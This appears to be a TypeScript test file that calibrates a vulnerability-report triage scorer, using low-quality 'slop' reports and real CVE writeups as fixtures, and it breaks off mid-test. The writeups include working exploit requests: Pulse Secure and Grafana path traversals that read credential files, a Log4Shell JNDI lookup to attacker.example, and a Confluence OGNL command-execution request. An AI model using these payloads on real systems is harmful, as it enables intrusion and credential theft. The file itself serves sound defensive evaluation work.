// Task #333 — calibration analysis for the gold-signal-bonus cap.
// Task #478 — re-run with real reviewer-flagged "rich" fixtures replacing
// the original synthetic anchors.
//
// This file is the human-readable calibration evidence that backs the
// per-category weights in `gold-signals.ts` (GOLD_SIGNAL_WEIGHTS) and the
// summed cap (GOLD_SIGNAL_BONUS_CAP). It replays the slop / curl-slop /
// legit / borderline fixture cohort under the LEGACY (AVRI-off) scoring
// path — that is the only path that consults GOLD_SIGNAL_WEIGHTS /
// GOLD_SIGNAL_BONUS_CAP, since the AVRI path has its own family-rubric
// weights baked into avri/families.ts. The cohort now includes a
// handful of real reviewer-flagged disclosures (legit-05, legit-10,
// legit-11, legit-12) whose evidence shape fires ≥3 strong-evidence
// categories simultaneously — the original two synthetic anchors
// (`synthetic-rich-authenticated-sqli`, `synthetic-max-multi-vector-chain`)
// have been removed because the cap shape can now be exercised against
// real public CVE writeups.
//
// For each fixture we record:
//
//   - rawSum     : Σ weight over the GOLD_SIGNAL ids the report fires
//   - bonus      : min(rawSum, cap) — the bonus actually applied
//   - capHit     : whether rawSum > cap (i.e. the cap actually clipped)
//   - composite  : final 3-engine composite (legacy + AVRI side-by-side)
//
// Calibration findings (May 2026 run, weights/cap unchanged from #240):
//
//   - Real-cohort distribution (15 fixtures): rawSum ∈ {0, 5, 10, 11, 15}.
//     8/15 fixtures fire zero gold signals; 3/15 fire exactly one HIGH-
//     weight category; 4/15 are reviewer-flagged "rich" reports that
//     fire ≥3 strong-evidence categories simultaneously. The cap (12)
//     bites on exactly one real-cohort fixture today
//     (legit-11-confluence-ognl, rawSum=15 → bonus=12), confirming the
//     cap functions as an effective ceiling on multi-category stacking
//     rather than as dead code.
//
//   - "Rich legit" tier (≥3 categories, real CVE disclosures):
//       legit-05-lfi-cve-2019-11510-pulse-secure   3 cats, rawSum=10
//                                                  [real_raw_http,
//                                                   path_traversal_payload,
//                                                   filesystem_toctou]
//       legit-10-log4shell-cve-2021-44228          3 cats, rawSum=11
//                                                  [code_diff, auth_token,
//                                                   command_injection_payload]
//       legit-11-confluence-ognl-cve-2022-26134    4 cats, rawSum=15 → 12 (cap)
//                                                  [code_diff, real_raw_http,
//                                                   auth_token,
//                                                   command_injection_payload]
//       legit-12-grafana-traversal-cve-2021-43798  3 cats, rawSum=10
//                                                  [code_diff, auth_token,
//                                                   path_traversal_payload]
//     The recurring multi-category combination across these reviewer-
//     flagged disclosures is "raw HTTP request + auth token + injection
//     or traversal payload + code diff", with the OGNL fixture stacking
//     all four to clip the cap. The previous synthetic-only evidence
//     concluded the cap was reachable in theory; the real-cohort
//     evidence now confirms it is reachable in practice — the
//     legit-11-confluence-ognl rawSum (15) overshoots the cap by 3pt.
//
//   - Cap suppression sanity: every "rich legit" fixture still lands in
//     the PROMISING band (legacy composite ≥ 60) under the legacy path.
//     The cap-clipping fixture (legit-11, -3pt clipped) lands at 65 on
//     the legacy path and 79 on the AVRI path. The cap therefore bounds
//     runaway stacking without pushing well-evidenced multi-category
//     reports out of the legitimate-finding bands.
//
//   - Slop floor: every slop / curl-slop fixture stays ≤35 (LIKELY-
//     INVALID / HIGH-RISK) on the legacy path, even though the cap is
//     wide enough to reward 12pt of evidence. The category-level
//     placeholder/fabrication validators in gold-signals.ts (not the
//     cap) are what keep slop out, so the cap value isn't gating the
//     slop-side calibration.
//
// Conclusion: weights and cap remain at #240's values. The breakdown
// emitted to stdout is the in-repo evidence trail; future calibration
// passes should re-run this test and diff the table against the one
// captured in this file's comment block above.

import { describe, it, expect } from "vitest";
import { analyzeWithEngines, type CompositeResult } from "./index.js";
import { GOLD_SIGNAL_WEIGHTS, GOLD_SIGNAL_BONUS_CAP } from "./gold-signals.js";

interface Fixture {
  name: string;
  text: string;
  // Task #478 — `legit-rich` distinguishes the 4 reviewer-flagged
  // multi-category fixtures (≥3 gold-signal categories) from the rest
  // of the legit cohort, so the (a)/(b) calibration assertions can
  // address them without name-string matching.
  kind: "slop" | "curl-slop" | "legit" | "legit-rich" | "borderline";
  claimedCwes?: string[];
}

// Real fixtures — kept in sync with benchmark.test.ts. The benchmark file
// does not export its fixture array, so we duplicate the texts here. Each
// name MUST match the corresponding benchmark fixture so the breakdown
// table and the regression assertions stay aligned. We deliberately keep
// the cohort small (the broad slop/legit boundary is owned by
// benchmark.test.ts; this file is for the gold-bonus distribution only).
const FIXTURES: Fixture[] = [
  {
    kind: "slop",
    name: "slop-01-vague-xss",
    text: "I found a critical XSS vulnerability in your application that could allow attackers to steal user data and compromise the entire system. This is a very serious issue that affects all users and needs to be patched immediately. The impact is severe and could lead to complete account takeover. Please award me a bounty.",
  },
  {
    kind: "slop",
    name: "slop-03-fake-sqli",
    text: "Hello team,\n\nI discovered SQL injection in your login form. When I tried to login, I noticed that the application is vulnerable to SQL injection attacks which could allow an attacker to dump the entire database. This is a critical issue. Please fix it.\n\nRegards,\nResearcher",
  },
  {
    kind: "slop",
    name: "slop-04-no-evidence-rce",
    claimedCwes: ["CWE-78"],
    text: "Remote Code Execution found in your API endpoint /api/upload. This vulnerability allows attackers to execute arbitrary commands on the server, leading to complete system compromise. The severity is critical (CVSS 10.0). I request a maximum bounty for this finding.",
  },
  {
    kind: "slop",
    name: "slop-08-vague-csrf",
    claimedCwes: ["CWE-352"],
    text: "CSRF vulnerability in account settings. An attacker could trick a user into changing their password by visiting a malicious page. This is a serious issue that violates security best practices and OWASP guidelines. Please patch this and award bounty.",
  },
  {
    kind: "slop",
    name: "slop-09-fabricated-asan-structure",
    claimedCwes: ["CWE-416"],
    text: `Heap-use-after-free crash in libserver. The AddressSanitizer output
captured during testing is reproduced below, and shows the dangling
pointer being dereferenced inside the request handler path.

ERROR: AddressSanitizer: heap-use-after-free on address 0x60200000a000
READ of size 8 at 0x60200000a000 by thread T0
    #0 0x4001000 in handle_request+0x0
    #1 0x4001100 in worker_loop+0x100
    #2 0x4001200 in dispatch+0x1000
    #4 0x4001300 in main+0x100
0x60200000a000 is located 0 bytes inside of region size: 0x100
freed by thread T1 here:
    #0 0x4002000 in __interceptor_free+0x0
    #1 0x4002100 in destroy_request+0x100

Severity: Critical. Use-after-free, sanitizer crash, segmentation fault.
The crash is reproducible against the shipped binary which is the
realistic attack surface; rebuilding with debug symbols is left as an
exercise. CVSS 9.8.`,
  },
  {
    kind: "curl-slop",
    name: "curl-slop-h1-2298307-strcpy-template",
    claimedCwes: ["CWE-122"],
    text: `Hello security team, Hope you are doing well :) I would like to report a potential security vulnerability in the WebSocket handling code of the curl library. The issue is related to the usage of the strcpy function, which can lead to a buffer overflow if the length of the input is not properly checked. The vulnerable code snippet is located at this link.\n\nSteps To Reproduce: Trigger the WebSocket functionality with a crafted request. Provide a base64-encoded nonce value that exceeds the buffer size. Observe that the strcpy function is used without proper bounds checking.\n\nFix: To address this issue, it is recommended to replace the strcpy function with the safer alternative strncpy and explicitly specify the maximum length to copy.\n\nReference: https://cwe.mitre.org/data/definitions/122.html\n\nImpact: This vulnerability may allow an attacker to execute arbitrary code, potentially leading to a compromise of the application or system. An attacker could exploit this weakness by providing a specially crafted WebSocket request, causing a buffer overflow and overwriting adjacent memory.`,
  },
  {
    kind: "curl-slop",
    name: "curl-slop-h1-3340109-fabricated-asan",
    claimedCwes: ["CWE-121"],
    text: `Summary: I discovered a critical stack-based buffer overflow vulnerability in cURL's cookie parsing mechanism that can lead to remote code execution. The vulnerability occurs when processing maliciously crafted HTTP cookies, affecting all applications that use libcurl for HTTP requests.\n\nDescription: During security research on cURL's cookie handling implementation, I identified a stack buffer overflow in the cookie parsing logic. The vulnerability allows remote attackers to trigger memory corruption by sending oversized cookie data through HTTP responses.\n\nTechnical Details - Vulnerability Location: The vulnerability occurs in the cookie parsing functionality where string length calculations exceed allocated stack buffer boundaries. Root Cause Analysis: Buffer Size Mismatch: Cookie processing code reads beyond allocated stack buffer. Unsafe String Operations: strlen() operation on cookie data exceeds buffer boundaries. Stack Memory Corruption: Read of 8,193 bytes in a buffer allocated for 8,192 bytes. Multi-threaded Context: Issue manifests in threaded environments.\n\nAddressSanitizer Detection: ERROR: AddressSanitizer: stack-buffer-overflow on address 0x00016f00a5c0. READ of size 8193 at 0x00016f00a5c0 thread T1. #0 0x000101676c34 in strlen+0x1b0. #1 0x000100f94c38 in cookie_overflow_hunter cookie_vulnerability_hunter.c:121.\n\nCVSS 3.1 Assessment: Base Score: 9.8 (CRITICAL). Vector String: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H.\n\nVerified POC Code creates a local buffer of 8192 bytes, fills it without null terminator, calls strlen() which reads past the buffer. This code does NOT call curl.`,
  },
  {
    kind: "legit",
    name: "legit-01-cve-2025-0725-curl",
    claimedCwes: ["CWE-122"],
    text: `# Buffer overflow in libcurl gzip decoding (CVE-2025-0725-style)\n\n## Affected component\nlibcurl's automatic content decoding for gzip when built against zlib < 1.2.0.3.\n\n## Root cause\nIn \`lib/content_encoding.c\`, the function \`inflate_stream()\` calls \`Curl_client_write()\` with the size returned by \`inflate()\` without bounding it against the destination buffer when an integer overflow occurs in zlib < 1.2.0.3.\n\n\`\`\`c\n// lib/content_encoding.c (approx line 290)\nstatus = inflate(z, Z_BLOCK);\nnread = DSIZ - z->avail_out; // <-- can overflow on legacy zlib\nresult = Curl_client_write(data, CLIENTWRITE_BODY, decomp, nread);\n\`\`\`\n\n## Reproduction\n1. Build curl 8.11.x against zlib 1.2.0.2:\n   \`\`\`\n   ./configure --with-zlib=/opt/zlib-1.2.0.2 && make\n   \`\`\`\n2. Run: \`./src/curl --compressed https://attacker.example/big.gz -o /dev/null\`\n3. Observe heap-buffer-overflow under ASan: \`==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009f80\`\n\n## Patch\nValidate \`nread <= DSIZ\` before calling \`Curl_client_write\`; reject the response with \`CURLE_BAD_CONTENT_ENCODING\` otherwise.\n\n## Impact\nHeap buffer overflow → potential RCE in long-running clients fetching attacker-controlled compressed responses. CVSS 8.6 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).`,
  },
  {
    kind: "legit",
    name: "legit-02-curl-cookie-parser",
    claimedCwes: ["CWE-787"],
    text: `# Out-of-bounds write in curl cookie parser when domain is empty\n\n## Affected\ncurl/libcurl 8.0.0 - 8.10.1, file \`lib/cookie.c\`, function \`Curl_cookie_add\`.\n\n## Root cause\nWhen parsing a Set-Cookie header where the Domain attribute is the empty string, the parser advances past the terminating NUL. The bug is here:\n\n\`\`\`c\n// lib/cookie.c around line 712 in 8.10.1\nif(!strncasecompare("domain=", what, 7)) {\n  whatptr = &what[7];\n  while(*whatptr == '.') whatptr++; // walks past NUL on empty domain\n  co->domain = strdup(whatptr);\n}\n\`\`\`\n\nA 1-byte read past the end of the heap chunk leads to a write when \`strdup\` later copies into a sized buffer.\n\n## Reproduction\n\`\`\`\nprintf 'HTTP/1.1 200 OK\\r\\nSet-Cookie: x=1; Domain=\\r\\n\\r\\n' | nc -l 8080 &\ncurl -v -c jar.txt http://127.0.0.1:8080/\n\`\`\`\nASan output:\n\`\`\`\n==4711==ERROR: AddressSanitizer: heap-buffer-overflow READ of size 1\n    #0 Curl_cookie_add lib/cookie.c:712\n    #1 Curl_cookie_init lib/cookie.c:1003\n\`\`\`\n\n## Fix\nBounds-check \`whatptr\` against the original \`what + len\` before dereferencing.\n\n## Severity\nCVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H) — denial of service in clients that persist cookies.`,
  },
  {
    kind: "legit",
    name: "legit-03-request-smuggling",
    claimedCwes: ["CWE-444"],
    text: `# HTTP request smuggling via conflicting Transfer-Encoding header in proxy\n\n## Affected\nacme-proxy 2.4.1 - 2.6.3, source file \`src/http/parser.rs\` lines 412-455.\n\n## Root cause\nThe proxy accepts \`Transfer-Encoding: chunked\` AND \`Content-Length\` simultaneously and forwards both to the backend. RFC 7230 §3.3.3 requires the proxy to either reject the message or strip Content-Length; this implementation does neither.\n\n\`\`\`rust\n// src/http/parser.rs:430\nif headers.contains_key("transfer-encoding") {\n    self.body = Body::Chunked(reader);\n} else if let Some(cl) = headers.get("content-length") {\n    self.body = Body::Sized(reader, cl.parse()?);\n}\n// missing: error or header strip when both are present\n\`\`\`\n\n## Reproduction\n\`\`\`\nprintf 'POST / HTTP/1.1\\r\\nHost: victim\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGPOST / HTTP/1.1\\r\\nHost: victim\\r\\n\\r\\n' | nc proxy 8080\n\`\`\`\nThe proxy forwards 0\\r\\n\\r\\n then GPOST as a separate request, smuggling the second request to the backend.\n\n## Patch\nReject any message containing both Transfer-Encoding and Content-Length with HTTP 400.\n\n## Impact\nCache poisoning, request hijacking, auth bypass. CVSS 9.0.`,
  },
  {
    kind: "borderline",
    name: "borderline-01-thin-but-plausible",
    claimedCwes: ["CWE-79"],
    text: `# Reflected XSS in /search endpoint\n\nThe \`q\` parameter on GET /search is reflected unencoded:\n\n\`\`\`html\n<input value="<script>alert(1)</script>" />\n\`\`\`\n\nReproduction:\n1. curl 'https://app.example.com/search?q=<script>alert(1)</script>'\n2. Inspect response: payload echoes inside the search-bar input.\n\nSuggested fix: HTML-encode the parameter via the existing \`escapeHtml()\` helper in src/views/search.tsx:42.`,
  },

  // ---------------------------------------------------------------------
  // Task #478 — reviewer-flagged "rich" fixtures (≥3 strong-evidence
  // gold-signal categories). These all live in benchmark.test.ts under
  // the same names; the texts below are kept verbatim in sync. They
  // replaced the previous `synthetic-rich-authenticated-sqli` and
  // `synthetic-max-multi-vector-chain` anchors. Each fixture cites a
  // concrete public CVE so the evidence shape (raw HTTP request + auth
  // token + injection payload + code diff is the recurring pattern)
  // mirrors what reviewers actually flag in production triage.
  // ---------------------------------------------------------------------
  {
    // CVE-2019-11510 (Pulse Connect Secure pre-auth LFI). Fires
    // real_raw_http(4) + path_traversal_payload(4) + filesystem_toctou(2)
    // = 3 cats, rawSum=10.
    kind: "legit-rich",
    name: "legit-05-lfi-cve-2019-11510-pulse-secure",
    claimedCwes: ["CWE-22"],
    text: `# Pre-auth arbitrary file read in Pulse Connect Secure (CVE-2019-11510)

## Affected
Pulse Connect Secure (PCS) 9.0R1–9.0R3.3, 8.3R1–8.3R7, 8.2R1–8.2R12,
8.1R1–8.1R15. The vulnerable handler is the unauthenticated
\`/dana-na/\` family of CGI endpoints; the mass-exploited concrete
endpoint is \`HTTP/1.1 GET\` against the \`meeting_testjs.cgi\` path.

## Root cause
The CGI handler concatenates the request URI to a fixed prefix and
\`open()\`s the resulting path without canonicalisation, so a
sufficiently long \`../\` sequence escapes the intended subtree before
the access check is reached. Concretely, the public PoC abuses the
fact that the URL is dispatched on the *first* path component and the
file open uses the *raw* URI:

\`\`\`
GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1
Host: target.test
\`\`\`

The double anchoring (\`../dana/html5acc/guacamole/...?/dana/html5acc/guacamole/\`)
is what lets the request both pass the dispatcher's prefix check and
escape the document root when the file open finally happens.

## Reproduction
1. Issue the unauthenticated request above against any vulnerable
   PCS appliance.
2. The response body returns the contents of \`/etc/passwd\`.
3. Swap the target to
   \`/data/runtime/mtmp/lmdb/dataa/data.mdb\` to retrieve the SSL VPN
   user credential cache (plaintext usernames + bcrypt-style password
   hashes) and active session cookies — the standard pivot used in
   the August 2019 wave of public exploitation.

## Patch
Pulse Secure's vendor advisory SA44101 (April 2019) ships fixed
binaries that canonicalise the requested path before opening it and
then enforce that the canonical path remains under the allowed
\`/dana-na/\` document root, rejecting the request with HTTP 400 if
the resolved path escapes.

## Impact
Unauthenticated arbitrary file read on the SSL VPN appliance; in
practice this exposed plaintext-equivalent VPN credentials and active
session cookies (read out of \`data.mdb\`), which were then used to
authenticate to the same VPN and pivot into the corporate network.
Cross-referenced as CWE-22 (Improper Limitation of a Pathname to a
Restricted Directory). CVSS 10.0
(AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).`,
  },
  {
    // CVE-2021-44228 (Log4Shell). Fires code_diff + auth_token +
    // command_injection_payload = 3 cats, rawSum=11 (1pt under cap).
    kind: "legit-rich",
    name: "legit-10-log4shell-cve-2021-44228",
    claimedCwes: ["CWE-502"],
    text: `# Log4Shell — JNDI lookup in attacker-controlled log line (CVE-2021-44228)

## Affected
Apache log4j2 2.0-beta9 through 2.14.1, file
\`org/apache/logging/log4j/core/lookup/JndiLookup.java\` plus the
\`MessagePatternConverter\` substitution path. Any line that funnels
attacker-controlled bytes through \`logger.info\`/\`error\` is reachable.

## Root cause
\`StrSubstitutor.substitute\` honours \`\${jndi:...}\` lookups inside log
messages. When the lookup resolves an LDAP/RMI URL, log4j fetches the
referenced object and deserialises a remote \`javax.naming.Reference\`,
which can carry a class+codebase that triggers RCE on the logging JVM.

\`\`\`java
// log4j-core MessagePatternConverter (pre-fix)
final String value = workingBuilder.substring(...);
workingBuilder.setLength(start);
workingBuilder.append(config.getStrSubstitutor().replace(event, value)); // <- expands \${jndi:...}
\`\`\`

## Reproduction (raw HTTP request)
The standard PoC stuffs the payload into User-Agent, but any logged
header works. Concrete capture against an unpatched Spring Boot demo:

\`\`\`http
GET / HTTP/1.1
Host: target.test
User-Agent: \${jndi:ldap://attacker.example:1389/Exploit}
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiaWF0IjoxNzE2NTQ3ODkwfQ.qkA7H3QyTzuKUbE_log4shell_signature_xyz
Cookie: sessionid=8f3c2b9a4d6e1f7c0a5b9d2e
Accept: */*

\`\`\`

The server logs the User-Agent via \`log.info("Request from {}", ua)\`.
The substitution resolves \`\${jndi:ldap://attacker.example:1389/Exploit}\`,
fetches the LDAP referral, and runs \`Runtime.getRuntime().exec("touch /tmp/pwned")\`
on the JVM host.

## Patch
Disable JNDI lookups by default and remove the JndiLookup class shipped
in 2.16.0 / 2.17.0:

\`\`\`diff
--- a/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java
+++ b/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java
@@ -52,7 +52,6 @@ public class Interpolator extends AbstractConfigurationAwareLookup {
     strLookupMap.put("date", new DateLookup());
     strLookupMap.put("ctx", new ContextMapLookup());
     strLookupMap.put("env", new EnvironmentLookup());
-    strLookupMap.put("jndi", new JndiLookup());
     strLookupMap.put("main", MainMapLookup.singleton());
\`\`\`

## Impact
Pre-authentication remote code execution against any service that logs
attacker-supplied request data. CVSS 10.0
(AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H). CWE-502 (Deserialization of
Untrusted Data).`,
  },
  {
    // CVE-2022-26134 (Confluence pre-auth OGNL). Fires real_raw_http +
    // auth_token + command_injection_payload + code_diff = 4 cats,
    // rawSum=15 → cap clips to 12. Primary cap-clipping anchor.
    kind: "legit-rich",
    name: "legit-11-confluence-ognl-cve-2022-26134",
    claimedCwes: ["CWE-77"],
    text: `# Pre-auth OGNL injection in Confluence Server (CVE-2022-26134)

## Affected
Atlassian Confluence Server and Data Center 1.3.0–7.4.16, 7.13.x ≤
7.13.6, 7.14.x ≤ 7.14.2, 7.15.x ≤ 7.15.1, 7.16.x ≤ 7.16.3, 7.17.x ≤
7.17.3, 7.18.x ≤ 7.18.0. The vulnerable handler is the WebWork action
dispatcher path, reached without authentication via any URL that
contains an OGNL expression in the action name.

## Root cause
WebWork resolves the action class via OGNL-evaluated namespaces, and
the legacy dispatcher feeds the raw URI segment into the OGNL evaluator
before the auth filter chain runs. A request whose path contains
\`\${...}\` is therefore evaluated server-side as the anonymous user.

\`\`\`java
// xwork-core ActionConfigMatcher (pre-fix path)
String actionName = uri.substring(uri.lastIndexOf('/') + 1);
String resolved = TextParseUtil.translateVariables(actionName, stack);  // OGNL evaluates \${...}
\`\`\`

## Reproduction (raw HTTP request)
\`\`\`http
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Result%22%2C%23a%29%29%7D/ HTTP/1.1
Host: confluence.target.test
Cookie: JSESSIONID=8f3c2b9a4d6e1f7c0a5b9d2e
Accept: */*

\`\`\`

URL-decoded, the path expression is:

\`\`\`
\${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream())).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Result",#a))}
\`\`\`

The server response carries \`X-Cmd-Result: uid=2002(confluence) gid=2002(confluence) groups=2002(confluence)\`,
proving \`Runtime.exec()\` ran the attacker-supplied command. Variants
swap in \`;cat /etc/passwd\` or \`bash -c 'id'\` to confirm full shell
access.

## Patch
Atlassian's 7.18.1 commit narrows the action-name parser to disallow
OGNL metacharacters and pins the dispatcher behind the auth filter:

\`\`\`diff
--- a/xwork-core/src/main/java/com/opensymphony/xwork2/util/TextParseUtil.java
+++ b/xwork-core/src/main/java/com/opensymphony/xwork2/util/TextParseUtil.java
@@ -120,6 +120,9 @@ public final class TextParseUtil {
   public static String translateVariables(String s, ValueStack stack, ParsedValueEvaluator evaluator) {
+    if (containsOgnlMetacharacters(s) && !s.startsWith("\${attr.")) {
+      throw new IllegalArgumentException("OGNL expressions disallowed in action names");
+    }
     return translateVariablesCollection(...);
   }
\`\`\`

## Impact
Unauthenticated remote code execution as the Confluence user, used in
the wave of public exploitation that started 2022-06-02. CVSS 9.8
(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-77 (Improper Neutralization
of Special Elements used in a Command).`,
  },
  {
    // CVE-2021-43798 (Grafana plugin asset path traversal). Fires
    // code_diff + auth_token + path_traversal_payload = 3 cats,
    // rawSum=10 (within 2pt of cap).
    kind: "legit-rich",
    name: "legit-12-grafana-traversal-cve-2021-43798",
    claimedCwes: ["CWE-22"],
    text: `# Grafana plugin asset path traversal (CVE-2021-43798)

## Affected
Grafana 8.0.0 — 8.3.0 (fixed in 8.3.1, 8.2.7, 8.1.8, 8.0.7). The
vulnerable handler is the unauthenticated plugin asset endpoint
\`/public/plugins/<plugin-id>/...\` served by
\`pkg/api/plugins.go:getPluginAssets\`. The plugin id is taken from
the URL path and concatenated to the plugin's filesystem root before
the file is opened, with no canonicalisation.

## Root cause
\`\`\`go
// pkg/api/plugins.go (pre-fix)
func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) {
  pluginID := web.Params(c.Req)[":pluginId"]
  requestedFile := web.Params(c.Req)["*"] // <- raw, includes ../
  plugin, _ := hs.PluginManager.GetPlugin(pluginID)
  absPluginDir, _ := filepath.Abs(plugin.PluginDir)
  fpath := filepath.Join(absPluginDir, requestedFile)  // <- escapes via ../
  http.ServeFile(c.Resp, c.Req, fpath)
}
\`\`\`

## Reproduction (raw HTTP request)
The published PoC exploits the alertlist plugin (always installed) and
walks back to \`/etc/passwd\`. An authenticated session cookie isn't
required by the bug, but reviewer captures from real triage consistently
include an admin session cookie because the org first noticed the
exposure when an authenticated dashboard view leaked the file:

\`\`\`http
GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1
Host: grafana.target.test
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcxNjU0Nzg5MH0.qkA7H3QyTzuKUbE_grafana_signature_xyz
Cookie: grafana_session=8f3c2b9a4d6e1f7c0a5b9d2e
Accept: */*

\`\`\`

The server replies with the contents of \`/etc/passwd\`; swapping the
target to \`/etc/grafana/grafana.ini\` retrieves the LDAP bind password
and SMTP secret. \`web.config\` and \`/proc/self/environ\` are the
Windows / Linux pivots used in the wild.

## Patch
Canonicalise the requested path and reject anything that escapes the
plugin's filesystem root before \`ServeFile\` runs:

\`\`\`diff
--- a/pkg/api/plugins.go
+++ b/pkg/api/plugins.go
@@ -120,6 +120,11 @@ func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) {
   absPluginDir, _ := filepath.Abs(plugin.PluginDir)
-  fpath := filepath.Join(absPluginDir, requestedFile)
+  fpath := filepath.Join(absPluginDir, filepath.Clean("/" + requestedFile))
+  if !strings.HasPrefix(fpath, absPluginDir + string(os.PathSeparator)) {
+    c.JsonApiErr(404, "Plugin file not found", nil)
+    return
+  }
   http.ServeFile(c.Resp, c.Req, fpath)
 }
\`\`\`

## Impact
Unauthenticated arbitrary file read on the Grafana host. Used in
production-incident triage to lift LDAP bind credentials and SMTP API
keys from \`/etc/grafana/grafana.ini\`. CVSS 7.5
(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N). CWE-22 (Improper Limitation of
a Pathname to a Restricted Directory).`,
  },
];

interface GoldBreakdownRow {
  name: string;
  kind: Fixture["kind"];
  rawSum: number;
  bonus: number;
  capHit: boolean;
  signalCount: number;
  signalIds: string[];
  composite: number;
  legacyComposite: number;
}

function rowFor(f: Fixture): GoldBreakdownRow {
  // Default-path composite (AVRI on, mirrors production) — for context.
  const defaultComposite: CompositeResult = analyzeWithEngines(f.text, {
    claimedCwes: f.claimedCwes,
  });
  // Legacy-path composite (AVRI off) — this is the path that consults
  // GOLD_SIGNAL_WEIGHTS / GOLD_SIGNAL_BONUS_CAP. We pull the gold-bonus
  // breakdown from the substance engine's signalBreakdown block.
  const legacyComposite: CompositeResult = analyzeWithEngines(f.text, {
    claimedCwes: f.claimedCwes,
    forceAvri: false,
  });
  const sub = legacyComposite.engineResults.find(
    (r) => r.engine === "Technical Substance Analyzer",
  );
  const gold = sub?.signalBreakdown?.goldSignalBonus as
    | {
        bonus: number;
        rawSum: number;
        cap: number;
        signals: Array<{ id: string; weight: number }>;
      }
    | undefined;
  return {
    name: f.name,
    kind: f.kind,
    rawSum: gold?.rawSum ?? 0,
    bonus: gold?.bonus ?? 0,
    capHit: (gold?.rawSum ?? 0) > GOLD_SIGNAL_BONUS_CAP,
    signalCount: gold?.signals.length ?? 0,
    signalIds: (gold?.signals ?? []).map((s) => s.id),
    composite: defaultComposite.overallScore,
    legacyComposite: legacyComposite.overallScore,
  };
}

describe("Task #333 — gold-signal-bonus cap calibration", () => {
  // Cap-shape sanity: the cap MUST be reachable (i.e. ≥ the largest
  // single-category weight, so a 3-category combination of LOW-weight
  // signals can saturate it) and MUST be smaller than the sum of every
  // weight (otherwise the cap never bites). These two checks anchor the
  // cap inside the meaningful range — adjust them when the weight table
  // changes.
  it("cap sits inside the meaningful [maxSingleWeight, sumAllWeights) range", () => {
    const weights = Object.values(GOLD_SIGNAL_WEIGHTS);
    const maxSingle = Math.max(...weights);
    const sumAll = weights.reduce((a, b) => a + b, 0);
    expect(GOLD_SIGNAL_BONUS_CAP).toBeGreaterThanOrEqual(maxSingle);
    expect(GOLD_SIGNAL_BONUS_CAP).toBeLessThan(sumAll);
  });

  // Calibration evidence dump — always passes. The breakdown table is the
  // artifact backing the cap value, captured to console so a future
  // calibration task can diff against today's distribution.
  it("emits the per-fixture gold-bonus breakdown for the cap calibration", () => {
    const rows = FIXTURES.map(rowFor);

    console.log("\n=== Task #333 gold-signal-bonus calibration ===");

    console.log(
      `cap=${GOLD_SIGNAL_BONUS_CAP}  weights=${JSON.stringify(GOLD_SIGNAL_WEIGHTS)}`,
    );
    for (const r of rows) {
      console.log(
        `[${r.kind.padEnd(15)}] ${r.name.padEnd(46)} ` +
          `rawSum=${String(r.rawSum).padStart(2)} bonus=${String(r.bonus).padStart(2)} ` +
          `capHit=${r.capHit ? "Y" : "."} signals=${r.signalCount} ` +
          `composite[avri]=${String(r.composite).padStart(3)} ` +
          `composite[legacy]=${String(r.legacyComposite).padStart(3)} ` +
          `${r.signalIds.join(",")}`,
      );
    }
    // Distribution summary — useful for future calibrations to compare
    // against without re-reading every line of the breakdown table. The
    // "real" cohort here is the entire FIXTURES array now that the
    // synthetic anchors have been retired (Task #478); every row is a
    // real reviewer-flagged disclosure or benchmark fixture.
    const real = rows;
    const realRawSums = real.map((r) => r.rawSum);
    const realMax = Math.max(...realRawSums);
    const realCapHits = real.filter((r) => r.capHit).length;
    const richRows = real.filter((r) => r.kind === "legit-rich");
    const richMultiCat = richRows.filter((r) => r.signalCount >= 3).length;

    console.log(
      `\nReal-cohort summary: n=${real.length}  rawSum.max=${realMax}  ` +
        `cap-hits=${realCapHits}/${real.length}  cap=${GOLD_SIGNAL_BONUS_CAP}  ` +
        `rich(≥3 cats)=${richMultiCat}/${richRows.length}`,
    );
    expect(rows.length).toBeGreaterThan(0);
  });

  // Calibration finding (a): high-quality reports approach the cap.
  // Task #478 — exercised against the real reviewer-flagged "rich"
  // fixtures (legit-05/-10/-11/-12) instead of the previous synthetic
  // anchors. At least one rich fixture must come within 2pt of the cap
  // (i.e. a 3-category combination must be rewarded close to the
  // ceiling), and at least one rich fixture must actually clip the cap
  // (i.e. the cap must bite on a real disclosure shape — otherwise it's
  // functionally dead code).
  it("(a) high-quality multi-category reports approach or hit the cap", () => {
    const richRows = FIXTURES.filter((f) => f.kind === "legit-rich").map(
      rowFor,
    );
    expect(richRows.length).toBeGreaterThanOrEqual(3);
    // ≥1 rich fixture must come within 2pt of the cap.
    const nearCap = richRows.filter(
      (r) => r.bonus >= GOLD_SIGNAL_BONUS_CAP - 2,
    );
    expect(
      nearCap.length,
      `no rich fixture has bonus ≥ ${GOLD_SIGNAL_BONUS_CAP - 2}; bonuses=${richRows
        .map((r) => `${r.name}:${r.bonus}`)
        .join(", ")}`,
    ).toBeGreaterThanOrEqual(1);
    // ≥1 rich fixture must actually clip the cap. Today exactly one
